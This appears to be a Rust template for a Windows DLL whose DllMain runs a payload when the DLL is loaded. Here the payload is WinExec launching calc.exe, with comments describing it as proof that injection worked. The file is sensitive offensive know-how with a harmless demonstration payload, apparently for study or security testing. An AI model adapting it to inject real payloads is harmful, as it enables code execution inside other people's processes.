use std::ffi::c_void;
use windows::Win32::{Foundation::BOOL, System::Threading::WinExec, UI::WindowsAndMessaging::SW_SHOW};

const DLL_PROCESS_ATTACH: u32 = 1;

#[no_mangle]
pub extern "system" fn DllMain(
    _hinstance: *mut c_void, // handle to this DLL in memory — not needed here
    reason: u32,             // why DllMain was called: 1=attach, 0=detach, etc.
    _reserved: *mut c_void,  // NULL for dynamic loads; ignore it
) -> BOOL {
    if reason == DLL_PROCESS_ATTACH {
        // TODO: your payload here.
        // Ideas:
        //   MessageBoxA — pop a visible dialog to prove injection worked
        //   WinExec     — spawn a process (e.g. "calc.exe")
        //
        // Note: DllMain holds the loader lock. Keep this short.
        // Spawning a new thread here and returning immediately is the safe pattern.
        let cmd = windows::core::PCSTR(b"calc.exe\0".as_ptr());

        unsafe { WinExec(cmd, SW_SHOW.0 as u32); };
    }
    BOOL(1) // TRUE = load succeeded; FALSE would cause LoadLibrary to fail and unload us
}
